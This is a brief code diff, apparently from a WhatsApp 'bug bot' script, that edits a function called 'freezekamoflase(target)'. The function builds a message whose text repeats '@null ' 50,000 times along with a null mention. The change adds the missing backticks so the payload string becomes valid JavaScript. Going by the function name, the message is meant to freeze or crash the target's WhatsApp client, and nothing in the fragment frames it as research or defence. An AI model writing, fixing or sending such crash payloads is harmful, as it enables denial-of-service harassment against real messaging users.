@@ -30,7 +30,7 @@ async function freezekamoflase(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: 𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐕2 🏴‍☠️ ${"@null ".repeat(50000)},
+                        text: `𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐕2 🏴‍☠️ ${"@null ".repeat(50000)}`,
                         contextInfo: { mentionedJid: ["null@s.whatsapp.net"] }
                     },
                     nativeFlowMessage: {},
